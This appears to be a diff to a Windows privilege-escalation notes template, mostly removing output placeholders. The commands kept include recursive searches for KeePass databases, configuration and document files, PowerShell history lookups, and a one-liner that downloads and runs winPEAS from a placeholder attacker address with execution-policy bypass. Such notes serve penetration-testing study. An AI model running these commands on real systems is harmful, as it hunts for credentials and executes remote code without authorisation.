@@ -77,46 +77,27 @@ dir $env:userprofile\Downloads
 ```powershell
 Get-Process
 ```
-```
-<insert output here>
-```
-### Enumerate filesystem for sensitive details
+## Enumerate filesystem for sensitive details
 Enumerate for password manager databases (i.e. .kbdx):
 ```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
-```
-<insert output here>
-```
 Enumerate application filesystem for interesting files (i.e. XAMPP):
 ```powershell
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-```
-```
-<insert output here>
 ```
 Enumerate home directory for interesting files:
 ```powershell
 Get-ChildItem -Path $env:userprofile -Include *.txt,*.pdf,*.xls,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
 ```
 Also check other paths such as C:\, C:\Users.
-```
-<insert output here>
-```
 # Powershell Logs
 ```powershell
 Get-History
 ```
-```
-<insert output here>
-```
+
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
-```
-```
-File Location: <insert output here>
-
-<insert file contents here>
 ```
 ## View Script Block Logging
 1. Open Event Viewer.
@@ -143,14 +124,9 @@ runas /user:$USER cmd
 ```powershell
 powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
 ```
-```
-<insert winpeas output here>
-```
+
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/winPEASx64.exe -Outfile winPEAS.exe
-```
-```
-<insert output from winpeas exe here>
 ```
 # PowerUp
 ```batch
